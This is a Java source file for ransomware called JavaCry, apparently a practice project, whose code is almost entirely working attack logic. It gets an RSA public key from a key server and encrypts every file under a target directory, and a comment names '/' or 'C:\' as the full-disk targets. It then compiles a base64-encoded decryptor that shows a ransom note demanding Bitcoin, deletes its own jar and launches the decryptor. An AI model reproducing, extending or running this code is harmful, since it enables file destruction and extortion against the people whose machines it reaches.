import java.util.*;
import java.util.stream.Collectors;
import java.net.*;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.stream.Stream;

import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.*;
import java.security.spec.X509EncodedKeySpec;



public class JavaCry {
/*
   Dangerous target paths:
   Mac & Linux:
   private static String targetPath = "/";

   Windows:
   private static String targetPath = "C:\";
 */
private static String addr = "127.0.0.1";
private static String targetPath = "/Users/daniel/Desktop/java_practice/JavaCry/Test_Env";
private static String os = System.getProperty("os.name").split(" ")[0];
private static List<Path> files = new ArrayList<Path>();
private static Random rand = new Random(System.currentTimeMillis());
private static int id = (int)(rand.nextInt(Integer.MAX_VALUE));
private static RSACrypt crypto;
private static String decryptorPayload = "aW1wb3J0IGphdmEuYXd0Lio7CmltcG9ydCBqYXZheC5zd2luZy4qOwppbXBvcnQgamF2YS5hd3QuZXZlbnQuKjsKaW1wb3J0IGphdmEuYXd0LkNvbG9yOwoKaW1wb3J0IGphdmEudXRpbC4qOwppbXBvcnQgamF2YS5uZXQuKjsKaW1wb3J0IGphdmEuaW8uKjsKaW1wb3J0IGphdmEuaW8uRmlsZU91dHB1dFN0cmVhbTsKaW1wb3J0IGphdmEudXRpbC5zdHJlYW0uQ29sbGVjdG9yczsKaW1wb3J0IGphdmEubmlvLmZpbGUuRmlsZXM7CmltcG9ydCBqYXZhLm5pby5maWxlLlBhdGg7CmltcG9ydCBqYXZhLm5pby5maWxlLlBhdGhzOwppbXBvcnQgamF2YS5pby5GaWxlSW5wdXRTdHJlYW07CmltcG9ydCBqYXZhLmlvLkZpbGVPdXRwdXRTdHJlYW07CmltcG9ydCBqYXZhLnNlY3VyaXR5LlNlY3VyZVJhbmRvbTsKaW1wb3J0IGphdmF4LmNyeXB0by5DaXBoZXI7CmltcG9ydCBqYXZheC5jcnlwdG8uS2V5R2VuZXJhdG9yOwppbXBvcnQgamF2YXguY3J5cHRvLlNlY3JldEtleTsKaW1wb3J0IGphdmF4LmNyeXB0by5zcGVjLlNlY3JldEtleVNwZWM7CmltcG9ydCBqYXZheC5jcnlwdG8uc3BlYy5JdlBhcmFtZXRlclNwZWM7CmltcG9ydCBqYXZhLnV0aWwuQmFzZTY0OwppbXBvcnQgamF2YS5uaW8uZmlsZS5QYXRoOwppbXBvcnQgamF2YS5uaW8uZmlsZS5QYXRoczsKaW1wb3J0IGphdmEudXRpbC5zdHJlYW0uU3RyZWFtOwoKaW1wb3J0IGphdmEuc2VjdXJpdHkuKjsKaW1wb3J0IGphdmEuc2VjdXJpdHkuSW52YWxpZEtleUV4Y2VwdGlvbjsKaW1wb3J0IGphdmF4LmNyeXB0by5CYWRQYWRkaW5nRXhjZXB0aW9uOwppbXBvcnQgamF2YXguY3J5cHRvLklsbGVnYWxCbG9ja1NpemVFeGNlcHRpb247CmltcG9ydCBqYXZhLnNlY3VyaXR5LnNwZWMuUEtDUzhFbmNvZGVkS2V5U3BlYzsKCgovKgogICBkZWNyeXB0b3I6CiAgIEJUQyBwYXltZW50IGludGVyZmFjZQogICBSZXF1ZXN0IGZvciBkZWNyeXB0aW9uIGZ1bmN0aW9uYWxpdHkKICAgaWYgcmVjZWl2ZXMgdGhlIGtleSwgdXNlIHRoZSBrZXkgdG8gZGVjcnlwdCB0aGUgZmlsZXMKICAgZGVzdHJveSBkZWNyeXB0b3IuamF2YQogKi8KCmNsYXNzIERlY3J5cHRvciB7CnByaXZhdGUgc3RhdGljIGludCBpZCA9IDgwMjEzMTUwMzsKcHJpdmF0ZSBTb2NrZXQgc29ja2V0Owpwcml2YXRlIHN0YXRpYyBTdHJpbmcgYWRkcmVzcyA9ICIxMjcuMC4wLjEiOwpwcml2YXRlIGludCBwb3J0Owpwcml2YXRlIERhdGFPdXRwdXRTdHJlYW0gb3V0ICAgICA9IG51bGw7CnByaXZhdGUgRGF0YUlucHV0U3RyZWFtIGluICAgICA9IG51bGw7CnByaXZhdGUgU3RyaW5nIGI2NHByaXZrZXk7CnByaXZhdGUgUHJpdmF0ZUtleSBwcml2YXRlX2tleTsKcHJpdmF0ZSBzdGF0aWMgamF2YS51dGlsLkxpc3Q8UGF0aD4gZmlsZXMgPSBuZXcgQXJyYXlMaXN0PFBhdGg+KCk7CnByaXZhdGUgc3RhdGljIFN0cmluZyB0YXJnZXRQYXRoID0gIi9Vc2Vycy9kYW5pZWwvRGVza3RvcC9qYXZhX3ByYWN0aWNlL0phdmFDcnkvVGVzdF9FbnYiOwpwcml2YXRlIENpcGhlciBSU0FfQ2lwaGVyOwpwcml2YXRlIENpcGhlciBBRVNfQ2lwaGVyOwoKcHVibGljIERlY3J5cHRvcigpIHsKICAgICAgICBwb3J0ID0gNTU1NTsKCiAgICAgICAgU3RyaW5nIG5vdGUgPSBTdHJpbmcuam9pbigiXG4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8aHRtbD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8aDEgc3R5bGUgPSAnZm9udC1zaXplOiAzMnB4O2ZvbnQtZmFtaWx5OiBMdWNpZGEgQ29uc29sZTsnPllvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZC48L2gxPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjxwPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIllvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gSWYgeW91IHdhbnQgdG8gZGVjcnlwdCB5b3VyIGZpbGVzLCBwbGVhc2UgY29weSB0aGUgY29udGVudCBvZiBzZW5kdG9tZS50eHQgc2VuZCBpdCB3aXRoICQxIEJUQyB0byBhZGRyZXNzLiBZb3UgY2FuIGdlbmVyYXRlIHRoZSB0cmFuc2FjdGlvbiBvdXRwdXQgd2l0aCA8YWRkcmVzcz5odHRwczovL2J0Y21lc3NhZ2UuY29tLzwvYWRkcmVzcz4sIGFuZCBjb3B5IGl0IHRvIHlvdXIgQlRDIHdhbGxldCB0byBzZW5kIG1lIHlvdXIgbW9uZXkuIEkgd2lsbCBjaGVjayB0aGUgcGF5bWVudHMgYmVmb3JlIEkgYXBwcm92ZSB5b3VyIHJlcXVlc3QgZm9yIGRlY3J5cHRpb24uIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPC9wPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjxwPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjxicj48Yj5Eb27igJl0IGRlbGV0ZSBvciBtb2RpZnkgYW55IGNvbnRlbnQgaW4gS2V5X3Byb3RlY3RlZC5rZXksIG9yIHlvdSB3aWxsIGxvc2UgeW91ciBhYmlsaXR5IHRvIGRlY3J5cHQgeW91ciBmaWxlcy48L2I+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPC9wPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjxwPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjxicj5JZiB5b3Ugd2FudCB0byBvcGVuIHRoaXMgd2luZG93IGFnYWluLCBwbGVhc2UgcnVuIERlY3J5cHRvci5qYXIuPGJyPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjwvcD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8L2h0bWw+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICBKRnJhbWUgZiA9IG5ldyBKRnJhbWUoKTsKICAgICAgICBKUGFuZWwgcGFuZWwgPSBuZXcgSlBhbmVsKG5ldyBGbG93TGF5b3V0KCkpOwogICAgICAgIEpMYWJlbCBodG1sID0gbmV3IEpMYWJlbChub3RlLCBKTGFiZWwuTEVGVCk7CgogICAgICAgIEpCdXR0b24gYiA9IG5ldyBKQnV0dG9uKCJSZXF1ZXN0IGZvciBEZWNyeXB0aW9uIik7CgogICAgICAgIEpMYWJlbCBzdGF0dXMgPSBuZXcgSkxhYmVsKCIiKTsKICAgICAgICBiLmFkZEFjdGlvbkxpc3RlbmVyKG5ldyBBY3Rpb25MaXN0ZW5lcigpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIEBPdmVycmlkZQogICAgICAgICAgICAgICAgICAgICAgICBwdWJsaWMgdm9pZCBhY3Rpb25QZXJmb3JtZWQoQWN0aW9uRXZlbnQgZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzLnNldFRleHQoIlRyeWluZyB0byBjb25uZWN0Iik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNvY2tldCA9IG5ldyBTb2NrZXQoYWRkcmVzcywgcG9ydCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cy5zZXRUZXh0KCJXYWl0aW5nIGZvciBhcHByb3ZhbCIpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gc2VuZHMgb3V0cHV0IHRvIHRoZSBzb2NrZXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW4gPSBuZXcgRGF0YUlucHV0U3RyZWFtKHNvY2tldC5nZXRJbnB1dFN0cmVhbSgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0ID0gbmV3IERhdGFPdXRwdXRTdHJlYW0oc29ja2V0LmdldE91dHB1dFN0cmVhbSgpKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dC53cml0ZVVURihTdHJpbmcudmFsdWVPZihpZCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBiNjRwcml2a2V5ID0gaW4ucmVhZFVURigpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oYjY0cHJpdmtleSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChiNjRwcml2a2V5LmVxdWFscygiYnV0IEkgcmVmdXNlIikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMuc2V0VGV4dCgiWW91ciByZXF1ZXN0IGhhcyBiZWVuIHJlamVjdGVkIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBwdWIgPSBCYXNlNjQuZ2V0RGVjb2RlcigpLmRlY29kZShiNjRwcml2a2V5KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUEtDUzhFbmNvZGVkS2V5U3BlYyBzcGVjID0gbmV3IFBLQ1M4RW5jb2RlZEtleVNwZWMocHViKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgS2V5RmFjdG9yeSBmYWN0b3J5ID0gS2V5RmFjdG9yeS5nZXRJbnN0YW5jZSgiUlNBIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaXZhdGVfa2V5ID0gZmFjdG9yeS5nZW5lcmF0ZVByaXZhdGUoc3BlYyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cy5zZXRUZXh0KCJZb3UgYXJlIGFwcHJvdmVkLCBkZWNyeXB0aW5nIGZpbGVzIik7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSU0FfQ2lwaGVyID0gQ2lwaGVyLmdldEluc3RhbmNlKCJSU0EiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQUVTX0NpcGhlciA9IENpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSAoU3RyZWFtPFBhdGg+IHBhdGhzID0gRmlsZXMud2FsayhQYXRocy5nZXQodGFyZ2V0UGF0aCkpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZXMgPSBwYXRocy5maWx0ZXIoRmlsZXM6OmlzUmVndWxhckZpbGUpLmNvbGxlY3QoQ29sbGVjdG9ycy50b0xpc3QoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlcnIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWNyeXB0RmlsZXMoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMuc2V0VGV4dCgiWW91J3JlIGZpbGVzIGhhdmUgYmVlbiBkZWNyeXB0ZWQgc3VjY2Vzc2Z1bGx5Iik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlcnIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMuc2V0VGV4dCgiRGVjcnlwdGlvbiBmYWlsZWQiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKCgoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoKFVua25vd25Ib3N0RXhjZXB0aW9uIHUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4odSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoKElPRXhjZXB0aW9uIGkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oaSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cy5zZXRUZXh0KCJDb25uZWN0aW9uIGZhaWxlZCIpOwogICAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlcnIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlcnIpOwogICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CgoKICAgICAgICBiLnNldEJvdW5kcygzMCwgMjAwLCAyMDAsIDUwKTsKICAgICAgICBzdGF0dXMuc2V0Qm91bmRzKDEwMCwgMzAwLCA0MDAsIDMwKTsKICAgICAgICBwYW5lbC5zZXRMYXlvdXQobmV3IEZsb3dMYXlvdXQoKSk7CgogICAgICAgIGYuc2V0QmFja2dyb3VuZChDb2xvci5SRUQpOwogICAgICAgIGYuYWRkKGIpOwogICAgICAgIGYuYWRkKHN0YXR1cyk7CgogICAgICAgIHBhbmVsLmFkZChodG1sKTsKICAgICAgICBmLmdldENvbnRlbnRQYW5lKCkuYWRkKHBhbmVsKTsKCiAgICAgICAgZi5zZXRTaXplKDEyMDAsNjAwKTsKCiAgICAgICAgZi5zZXRUaXRsZSgiSmF2YUNyeSBEZWNyeXB0b3IiKTsKICAgICAgICBmLnNldERlZmF1bHRDbG9zZU9wZXJhdGlvbihKRnJhbWUuRVhJVF9PTl9DTE9TRSk7CgogICAgICAgIGYuc2V0VmlzaWJsZSh0cnVlKTsKfQoKcHVibGljIGJ5dGVbXSBSU0FDcnlwdChGaWxlIGYpIHsKICB0cnkgewogICAgRmlsZUlucHV0U3RyZWFtIGluID0gbmV3IEZpbGVJbnB1dFN0cmVhbShmKTsKICAgIGJ5dGVbXSBpbnB1dCA9IG5ldyBieXRlWyhpbnQpIGYubGVuZ3RoKCldOwogICAgaW4ucmVhZChpbnB1dCk7CgogICAgRmlsZU91dHB1dFN0cmVhbSBvdXQgPSBuZXcgRmlsZU91dHB1dFN0cmVhbShmKTsKICAgIGJ5dGVbXSBvdXRwdXQgPSBSU0FfQ2lwaGVyLmRvRmluYWwoaW5wdXQpOwoKICAgIHJldHVybiBvdXRwdXQ7CiAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgIFN5c3RlbS5vdXQucHJpbnRsbihlKTsKICB9CiAgcmV0dXJuIG51bGw7Cn0KCnB1YmxpYyB2b2lkIEFFU0NyeXB0KEZpbGUgZikgewogIHRyeSB7CiAgICBGaWxlSW5wdXRTdHJlYW0gaW4gPSBuZXcgRmlsZUlucHV0U3RyZWFtKGYpOwogICAgYnl0ZVtdIGlucHV0ID0gbmV3IGJ5dGVbKGludCkgZi5sZW5ndGgoKV07CiAgICBpbi5yZWFkKGlucHV0KTsKCiAgICBGaWxlT3V0cHV0U3RyZWFtIG91dCA9IG5ldyBGaWxlT3V0cHV0U3RyZWFtKGYpOwogICAgYnl0ZVtdIG91dHB1dCA9IEFFU19DaXBoZXIuZG9GaW5hbChpbnB1dCk7CiAgICBvdXQud3JpdGUob3V0cHV0KTsKCiAgICBvdXQuZmx1c2goKTsKICAgIG91dC5jbG9zZSgpOwogICAgaW4uY2xvc2UoKTsKICAgIFN5c3RlbS5vdXQucHJpbnRsbigiRGVjcnlwdGluZyBmaWxlOiAiICsgZik7CiAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgIFN5c3RlbS5vdXQucHJpbnRsbihlKTsKICB9Cn0KCnB1YmxpYyB2b2lkIGRlY3J5cHRGaWxlcygpIHRocm93cyBFeGNlcHRpb24gewoKICBSU0FfQ2lwaGVyLmluaXQoQ2lwaGVyLkRFQ1JZUFRfTU9ERSwgcHJpdmF0ZV9rZXkpOwogIEZpbGUgayA9IG5ldyBGaWxlKCJLZXlfcHJvdGVjdGVkLmtleSIpOwogIGJ5dGVbXSBkYXRhID0gUlNBQ3J5cHQoayk7CiAgU2VjcmV0S2V5IEFFU0tleSA9IG5ldyBTZWNyZXRLZXlTcGVjKGRhdGEsIDAsIGRhdGEubGVuZ3RoLCAiQUVTIik7CiAgQUVTX0NpcGhlci5pbml0KENpcGhlci5ERUNSWVBUX01PREUsIEFFU0tleSk7CiAgZm9yIChQYXRoIHAgOiBmaWxlcykgewogICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgRmlsZSBmID0gcC50b0ZpbGUoKTsKICAgICAgICAgICAgICAgICAgQUVTQ3J5cHQoZik7CiAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZSk7CiAgICAgICAgICB9CiAgfQoKfQoKLy8gbWFpbiBtZXRob2QKcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nIGFyZ3NbXSkgewoKLy8gY3JlYXRpbmcgaW5zdGFuY2Ugb2YgRnJhbWUgY2xhc3MKICAgICAgICBEZWNyeXB0b3IgYXd0X29iaiA9IG5ldyBEZWNyeXB0b3IoKTsKfQoKfQo=";
private static Process process;
private static List<String> avoidDir = new ArrayList<String>();

// decrypt files from a list of paths
public static void decryptFiles(String keyString) {
        crypto.setPubKey(keyString);

        for (Path p : files) {
                try {
                        File f = p.toFile();
                        crypto.decrypt(f);
                } catch (Exception e) {
                        System.out.println(e);
                }
        }
}

// encrypt files from a list of paths
public static void encryptFiles() {
        for (Path p : files) {
                try {
                        File f = p.toFile();
                        crypto.encrypt(f);
                } catch (Exception e) {
                        System.out.println(e);
                }
        }
}

public static String replaceLine(String src, int lineno, String content) {
        String out = "";
        String[] lines = src.split("\n");
        for (int i = 0; i < lines.length; i++) {
                if (i+1 == lineno) {
                        out += content + "\n";
                } else {
                        out += lines[i] + "\n";
                }
        }
        return out;
}

public static void main(String[] args) {
        System.out.println("You're on " + os); // Windows Mac Linux SunOS FreeBSD

        KeyClient key_client = new KeyClient(addr, 6666);
        if (key_client.getSuccess()) {

                try {
                        // send id hash to server
                        MessageDigest md = MessageDigest.getInstance("SHA-256");
                        byte[] hash = md.digest(String.valueOf(id).getBytes(StandardCharsets.UTF_8));
                        String b64hash = Base64.getEncoder().encodeToString(hash);
                        key_client.sendString(b64hash);

                        // received allocated public key
                        String b64pubkey = key_client.recvString();
                        byte[] pub = Base64.getDecoder().decode(b64pubkey);
                        X509EncodedKeySpec spec = new X509EncodedKeySpec(pub);
                        KeyFactory factory = KeyFactory.getInstance("RSA");
                        PublicKey public_key = factory.generatePublic(spec);

                        crypto = new RSACrypt(public_key);

                        key_client.close();
                } catch (Exception e) {
                        System.out.println(1+""+e);
                        return;
                }

                avoidDir.add("windows");
                avoidDir.add("library");
                avoidDir.add("boot");
                avoidDir.add("local");
                avoidDir.add("program files");
                avoidDir.add("programdata");
                avoidDir.add("System");
                avoidDir.add("Volumes");
                avoidDir.add("dev");
                avoidDir.add("etc");
                avoidDir.add("bin");
                avoidDir.add("$");

                // encrypt files recursively within the target directory
                try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
                        files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
                }
                catch (Exception e) {
                        ;
                }

                // This will encrypt files recursively in the target directory
                encryptFiles();
                crypto.SaveAESKey();


                try {
                        File f = new File("Decryptor.java");
                        if (!f.exists()) {
                                f.createNewFile();
                        }
                        File m = new File("manifest.txt");
                        if (!m.exists()) {
                                m.createNewFile();
                        }

                        // create Decryptor.jar
                        String code = new String(Base64.getDecoder().decode(decryptorPayload));
                        code = replaceLine(code, 43, "private static int id = " + String.valueOf(id) + ";");
                        FileWriter writer = new FileWriter("Decryptor.java");
                        PrintStream manifest = new PrintStream(new File("manifest.txt"));
                        manifest.println("Main-Class: Decryptor");
                        writer.write(code);
                        writer.close();

                        // run Decryptor.java
                        process = Runtime.getRuntime().exec(String.format("javac Decryptor.java", System.getProperty("user.home")));
                        BufferedReader b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                        String s;
                        while ((s = b.readLine()) != null) {
                                System.out.println(s);
                        }
                        b.close();

                        process = Runtime.getRuntime().exec(String.format("jar -cvmf manifest.txt Decryptor.jar Decryptor.class Decryptor$1.class ", System.getProperty("user.home")));
                        b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                        while ((s = b.readLine()) != null) {
                                System.out.println(s);
                        }
                        b.close();

                        if (f.delete()) {
                                System.out.println("Deleted the file: " + f.getName());
                        } else {
                                System.out.println("Failed to delete the file.");
                        }
                        if (m.delete()) {
                                System.out.println("Deleted the file: " + m.getName());
                        } else {
                                System.out.println("Failed to delete the file.");
                        }

                        File classFile = new File("Decryptor.class");
                        if (classFile.delete()) {
                                System.out.println("Deleted the file: " + classFile.getName());
                        } else {
                                System.out.println("Failed to delete the file.");
                        }

                        File helperFile = new File("Decryptor$1.class");
                        if (helperFile.delete()) {
                                System.out.println("Deleted the file: " + helperFile.getName());
                        } else {
                                System.out.println("Failed to delete the file.");
                        }

                        File self = new File("JavaCry.jar");
                        if (self.exists()) {
                          self.delete();
                        }


                        process = Runtime.getRuntime().exec(String.format("java -jar Decryptor.jar", System.getProperty("user.home")));

                } catch (Exception e) {
                        System.out.println(2+""+e);
                }

        }
}
}
